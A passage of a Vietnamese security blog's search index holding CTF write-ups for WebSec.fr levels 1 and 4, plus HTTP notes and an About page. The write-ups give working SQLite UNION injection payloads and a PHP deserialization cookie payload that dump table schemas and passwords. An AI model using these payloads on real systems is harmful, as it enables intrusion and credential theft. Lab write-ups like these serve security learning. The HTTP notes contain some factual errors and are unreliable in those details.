class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs txt">BOOLEAN<br>b:value (value ch·ªâ c√≥ gi√° tr·ªã 1 ho·∫∑c 0. 1 l√† ƒë√∫ng, 0 l√† sai).<br><br>STRING<br>s:size:value (s:5:&quot;12345&quot;)<br><br>INTEGER<br>i:value<br><br>NULL<br>N;<br><br>ARRAY<br>a:size:&#123;key:value; (l·∫∑p l·∫°i key:value ƒë·∫øn khi b·∫±ng size))&#125;<br><br>OBJECT<br>O:length_object_name:object_name:object_size:&#123;&lt;property&gt;:&lt;value&gt;&#125;<br></code></pre></td></tr></table></figure><hr><p>Challenge cho 2 source code, nh∆∞ng ch√∫ √Ω trong source 1 l√† vi·∫øt ·ªü d·∫°ng OOP, c√≥ c√°c <a href="https://www.php.net/manual/en/language.oop5.magic.php">Magic Methods</a> ƒë∆∞·ª£c d√πng nh∆∞ <code>__construct()</code>, <code>__destruct()</code>.</p><ul><li><p><code>__construct()</code>: h√†m n√†y ƒë∆∞·ª£c g·ªçi khi kh·ªüi t·∫°o m·ªôt ƒë·ªëi t∆∞·ª£ng.</p></li><li><p><code>__destruct()</code>: h√†m n√†y ƒë∆∞·ª£c g·ªçi khi ƒë·ªëi t∆∞·ª£ng b·ªã xo√° ƒëi. Khi n√≥ kh√¥ng tham chi·∫øu ƒë·∫øn ƒë·ªëi t∆∞·ª£ng deserialize t·ªìn t·∫°i.</p></li></ul><p><img src="/img/CTF/WebSec/lv4/image1.png" alt="Source code 1"></p><p><img src="/img/CTF/WebSec/lv4/image2.png" alt="Source code 2"></p><p>Qu√° tr√¨nh serialize v√† deserialize di·ªÖn ra nh∆∞ h√¨nh b√™n d∆∞·ªõi:</p><p><img src="/img/CTF/WebSec/lv4/ser_deser.png" alt="Serialize &amp; Deserialize"></p><hr><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>ƒê·ªÉ √Ω d√≤ng code ·ªü source 2. Th√¨ gi√° tr·ªã cookie leet_hax0r ƒë∆∞·ª£c <code>encode base64</code>.</p><p>M√¨nh s·∫Ω t·∫°o d√≤ng Code gi·ªëng class SQL ƒë·ªÉ serialize n√≥.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SQL</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$query</span>=<span class="hljs-string">&#x27;select username from users where id = -1 union select sql from sqlite_master&#x27;</span>;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SQL</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>), PHP_EOL;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p>Sau khi bulid source xong, run code s·∫Ω ra Object v√† ƒëo·∫°n base64 nh∆∞ sau:</p><p><img src="/img/CTF/WebSec/lv4/image3.png" alt="Serialize SQL Object"></p><p><em>V√¨ sao ph·∫£i d√πng UNION ƒë·ªÉ select sql m√† kh√¥ng select ·ªü v·∫ø tr∆∞·ªõc lu√¥n?</em></p><blockquote><p>V√¨ ta ƒë·ªÉ √Ω source code 2, trong h√†m <code>__destruct()</code> ch·ªâ in ra m√†n h√¨nh <code>$row[&#39;username&#39;]</code>. N√™n b·∫Øt bu·ªôc trong c√¢u query c·ªßa m√¨nh ph·∫£i select username.</p></blockquote><p>Ho·∫∑c c√≥ th·ªÉ d√πng c√¢u query g√°n t√™n c·ªôt c·∫ßn select b·∫±ng username nh∆∞ sau cho g·ªçn:</p><pre><code class="sql">select group_concat(sql) as username from ...</code></pre><p>Copy ƒëo·∫°n base64 thay th·∫ø gi√° tr·ªã cookie leet_hax0r, sau ƒë√≥ g·ª≠i reuqest:</p><p><img src="/img/CTF/WebSec/lv4/image4.png" alt="C·∫•u tr√∫c c√¢u query ƒë∆∞·ª£c d√πng"></p><p>Ki·ªÉm tra xem c√≤n table n√†o ngo√†i users kh√¥ng? K·∫øt qu·∫£ l√† kh√¥ng c√≤n table n√†o kh√°c.</p><p><img src="/img/CTF/WebSec/lv4/image5.png" alt="Check another table"></p><p>M√¨nh ƒëo√°n l√† Flag n·∫±m ·ªü password, n√™n s·∫Ω select password ra.</p><p><img src="/img/CTF/WebSec/lv4/image6.png" alt="Payload get flag"></p><p><img src="/img/CTF/WebSec/lv4/image7.png" alt="Got the flag"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Websec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>babysteps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[WebSec] Level 1</title>
    <link href="/2022/07/19/Level1/"/>
    <url>/2022/07/19/Level1/</url>
    
    <content type="html"><![CDATA[<blockquote><p><a href="https://websec.fr/level01/index.php">https://websec.fr/level01/index.php</a></p></blockquote><h3 id="Gathering-information"><a href="#Gathering-information" class="headerlink" title="Gathering information"></a><strong>Gathering information</strong></h3><p>Sau khi nh√¨n s∆° qua b·ªëi c·∫£nh challenge, th√¨ c√≥ 1 ch·ªó input l√† s·ªë ƒë·ªÉ xem th√¥ng tin ID.<br>V√† challenge c≈©ng ƒë√£ cho source s·∫µn:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">LevelOne</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doQuery</span>(<span class="hljs-params"><span class="hljs-variable">$injection</span></span>) </span>&#123;<br>        <span class="hljs-variable">$pdo</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SQLite3</span>(<span class="hljs-string">&#x27;database.db&#x27;</span>, SQLITE3_OPEN_READONLY);<br>        <br>        <span class="hljs-variable">$query</span> = <span class="hljs-string">&#x27;SELECT id,username FROM users WHERE id=&#x27;</span> . <span class="hljs-variable">$injection</span> . <span class="hljs-string">&#x27; LIMIT 1&#x27;</span>;<br>        <span class="hljs-variable">$getUsers</span> = <span class="hljs-variable">$pdo</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$query</span>);<br>        <span class="hljs-variable">$users</span> = <span class="hljs-variable">$getUsers</span>-&gt;<span class="hljs-title function_ invoke__">fetchArray</span>(SQLITE3_ASSOC);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$users</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$users</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>V·ªõi ƒëo·∫°n code tr√™n, t·∫°i d√≤ng 5. N·∫øu nh∆∞ m√¨nh truy·ªÅn v√†o l√† d·∫•u ‚Äò, ch·ªØ c√°i, k√≠ t·ª± ƒë·∫∑c bi·ªát th√¨ s·∫Ω b√°o l·ªói.</p><p><img src="/img/CTF/WebSec/lv1/image1.png" alt="L·ªói khi nh·∫≠p ch·ªØ a"></p><p>V·ªõi source code v√† th√¥ng b√°o l·ªói, m√¨nh x√°c ƒë·ªãnh ƒë∆∞·ª£c ƒë√¢y l√† l·ªói SQL injection tr√™n SQLite3.</p><h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a><strong>Exploit</strong></h3><p>V√¨ ID ki·ªÉu d·ªØ li·ªáu th∆∞·ªùng l√† s·ªë, n√™n m√¨nh s·∫Ω d√πng k·ªπ thu·∫≠t khai th√°c l√† <a href="https://sechow.com/bricks/docs/content-page-1.html">UNION</a>.</p><ul><li>Ki·ªÉm tra s·ªë c·ªôt ƒë∆∞·ª£c select.</li></ul><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs txt">1 order by 2 ==&gt; OK<br>1 order by 3 ==&gt; ERROR<br></code></pre></td></tr></table></figure><p>V·∫≠y l√† c√≥ 2 c·ªôt ƒë∆∞·ª£c select.</p><p>Ti·∫øp theo c·∫ßn xem c√°c c·ªôt ƒë√≥ l√† g√¨.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-keyword">sql</span>,<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> sqlite_master<br><span class="hljs-operator">/</span><span class="hljs-operator">/</span> <span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> users(id <span class="hljs-type">int</span>(<span class="hljs-number">7</span>), username <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>), password <span class="hljs-type">varchar</span>(<span class="hljs-number">255</span>))<br></code></pre></td></tr></table></figure><p><img src="/img/CTF/WebSec/lv1/image2.png" alt="Query ƒë∆∞·ª£c d√πng"></p><p>X√°c ƒë·ªãnh ƒë∆∞·ª£c table l√† <code>users</code> v√† c√°c c·ªôt l√† <code>id, username, password</code>.</p><p>T√¨m xem c√≤n table n√†o ngo√†i users hay kh√¥ng?</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> group_concat(tbl_name),<span class="hljs-number">2</span> <span class="hljs-keyword">from</span> sqlite_master <span class="hljs-keyword">where</span> type<span class="hljs-operator">=</span><span class="hljs-string">&#x27;table&#x27;</span> <span class="hljs-keyword">and</span> tbl_name <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;sqlite_%&#x27;</span><br></code></pre></td></tr></table></figure><p>Cu·ªëi c√πng get flag th√¥i.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">2</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> password <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username<span class="hljs-operator">=</span>&quot;flag&quot;<br></code></pre></td></tr></table></figure><p><img src="/img/CTF/WebSec/lv1/image3.png" alt="Flag"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>Websec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>babysteps</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HTTP‚ÅÑHTTPS</title>
    <link href="/2022/07/19/HTTP%E2%81%84HTTPS/"/>
    <url>/2022/07/19/HTTP%E2%81%84HTTPS/</url>
    
    <content type="html"><![CDATA[<h1 id="HTTP-x2F-HTTPS"><a href="#HTTP-x2F-HTTPS" class="headerlink" title="HTTP&#x2F;HTTPS"></a>HTTP&#x2F;HTTPS</h1><p>Created: June 20, 2021 8:30 AM<br>Status: Complete</p><p><img src="/img/Security/Web/url.png"></p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><p>Hypertext Transfer Protocol (giao th·ª©c truy·ªÅn t·∫£i si√™u vƒÉn b·∫£n).</p><p>D√πng port: 80</p><p>Giao th·ª©c c∆° b·∫£n d√πng cho World Wide Web (www) ƒë·ªÉ truy·ªÅn d·ªØ li·ªáu d∆∞·ªõi d·∫°ng vƒÉn b·∫£n, h√¨nh ·∫£nh, √¢m thanh t·ª´ webserver ƒë·∫øn c√°c tr√¨nh duy·ªát v√† ng∆∞·ª£c l·∫°i.</p><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><p>Hypertext Transfer Protocol Secure.</p><p>D√πng port: 443&#x2F;4433</p><p>D·ªØ li·ªáu chuy·ªÉn t·ª´ Webserver ƒë·∫øn tr√¨nh duy·ªát kh√¥ng ƒë∆∞·ª£c m√£ h√≥a, d·ªÖ b·ªã ƒë√°nh c·∫Øp. Giao th·ª©c https d√πng SSL (secure sockets layer - l·ªõp c·ªïng b·∫£o m·∫≠t) ƒë·ªÉ m√£ h√≥a d·ªØ li·ªáu gi·ªØa website v√† web browser. Hi·ªán t·∫°i SSL kh√¥ng c√≤n ƒë∆∞·ª£c s·ª≠ d·ª•ng n·ªØa, chuy·ªÉn sang TSL (Transport Security Layer), gi·ªëng nh∆∞ SSL. </p><p><img src="/img/Security/Web/http.png"></p><h2 id="HTTP-Status-Code"><a href="#HTTP-Status-Code" class="headerlink" title="HTTP Status Code"></a>HTTP Status Code</h2><ul><li>100-199: Information <em>(100: Continue; 101: Switching protocols)</em>.</li><li>200-299: Successes <em>(200 OK is the ‚Äúnormal‚Äù response for a GET; 201: Created; 201: Accepted; 203: Non-authoritative information; 204: No content; 205: Reset content; 206: Partial content)</em></li><li>300-399: Redirects <em>(the information you want is elsewhere‚Äô 301: Moved permanently; 302: Moved temporarily; 304: Not modified)</em></li><li>400-499: Client errors <em>(You did something wrong, like asking for something that doesn‚Äôt exist; 403: forbidden; 404: not found; 405: Method not allowed; ‚Ä¶)</em></li><li>500-599: Server errors <em>(The server tried, but something went wrong on their side; 500: internal server error; 501: Not implemented; 502: Bad gateway; 505: Gateway timeout)</em></li></ul><p><strong>Vi du</strong></p><ul><li>201 Created ‚Äì Tr·∫£ v·ªÅ khi m·ªôt Resouce v·ª´a ƒë∆∞·ª£c t·∫°o th√†nh c√¥ng.</li><li>204 No Content ‚Äì Tr·∫£ v·ªÅ khi Resource xo√° th√†nh c√¥ng.</li><li>304 Not Modified ‚Äì Client c√≥ th·ªÉ s·ª≠ d·ª•ng d·ªØ li·ªáu cache.</li><li>400 Bad Request ‚Äì Request kh√¥ng h·ª£p l·ªá</li><li>401 Unauthorized ‚Äì Request c·∫ßn c√≥ auth.</li><li>403 Forbidden ‚Äì b·ªã t·ª´ ch·ªëi kh√¥ng cho ph√©p.</li><li>404 Not Found ‚Äì Kh√¥ng t√¨m th·∫•y resource t·ª´ URI</li><li>405 Method Not Allowed ‚Äì Ph∆∞∆°ng th·ª©c kh√¥ng cho ph√©p v·ªõi user hi·ªán t·∫°i.</li><li>410 Gone ‚Äì Resource kh√¥ng c√≤n t·ªìn t·∫°i, Version c≈© ƒë√£ kh√¥ng c√≤n h·ªó tr·ª£.</li><li>415 Unsupported Media Type ‚Äì Kh√¥ng h·ªó tr·ª£ ki·ªÉu Resource n√†y.</li><li>422 Unprocessable Entity ‚Äì D·ªØ li·ªáu kh√¥ng ƒë∆∞·ª£c x√°c th·ª±c</li><li>429 Too Many Requests ‚Äì Request b·ªã t·ª´ ch·ªëi do b·ªã gi·ªõi h·∫°n</li></ul><p><strong>HTTP Request methods (HTTP Verb Tampering)</strong></p><p><strong>GET</strong>: l·∫•y th√¥ng tin t·ª´ server ƒë√£ cung c·∫•p t·ª´ url. (C√°c y√™u c·∫ßu GET ko ·∫£nh h∆∞·ªõng ƒë·∫øn d·ªØ li·ªáu).</p><p><strong>HEAD</strong>: t∆∞∆°ng t·ª± GET, nh∆∞ng c√≥ th√™m tr·∫°ng th√°i v√† khu v·ª±c Header.</p><p><strong>POST</strong>: y√™u c·∫ßu g·ª≠i d·ªØ li·ªáu ƒë·∫øn server. (vd: th√¥ng tin kh√°ch h√†ng, file t·∫£i l√™n, ..), s·ª≠ d·ª•ng c√°c th·∫ª HTML.</p><p><strong>PUT</strong>: thay ƒë·ªïi t·∫•t c·∫£ c√°c ƒë·∫°i di·ªán c·ªßa ngu·ªìn v·ªõi n·ªôi dung ƒë∆∞·ª£c t·∫£i l√™n.</p><p><strong>DELETE</strong>: g·ª° b·ªè t·∫•t c·∫£ c√°c ƒë·∫°i di·ªán c·ªßa ngu·ªìn b·ªüi URL.</p><p><strong>CONNECT</strong>: thi·∫øt l·∫≠p m·ªôt tunnel t·ªõi server ƒë∆∞·ª£c x√°c ƒë·ªãnh b·ªüi URl ƒë√£ c·∫•p.</p><p><strong>OPTIONS</strong>: mi√™u t·∫£ ch·ª©c nƒÉng giao ti·∫øp cho ngu·ªìn m·ª•c ti√™u.</p><p><strong>TRACE</strong>: tr√¨nh b√†y v√≤ng l·∫∑p ki·ªÉm tra th√¥ng b√°o song song v·ªõi path t·ªõi resource.</p>]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>http</tag>
      
    </tags>
    
  </entry>
  
  
  
  
  
  
  <entry>
    <title>About</title>
    <link href="/"/>
    <url>/</url>
    
    <content type="html"><![CDATA[<h2 id="Hi-guys-I‚Äôm-a-student-and-a-pentester"><a href="#Hi-guys-I‚Äôm-a-student-and-a-pentester" class="headerlink" title="Hi guys, I‚Äôm a student and a pentester"></a><p align="center" style="color:#2ECC71"><strong>Hi guys, I‚Äôm a student and a pentester</strong></p></h2><hr><p><strong>Email</strong>: <a href="mailto:&#x6b;&#104;&#97;&#x64;&#111;&#x2e;&#x68;&#x63;&#109;&#64;&#x67;&#109;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;">&#x6b;&#104;&#97;&#x64;&#111;&#x2e;&#x68;&#x63;&#109;&#64;&#x67;&#109;&#x61;&#x69;&#x6c;&#x2e;&#x63;&#x6f;&#x6d;</a></p><p><strong>Linkedin</strong>: <a href="https://www.linkedin.com/in/khadv">https://www.linkedin.com/in/khadv</a></p>]]></content>
    
  </entry>
  
  
  
</search>
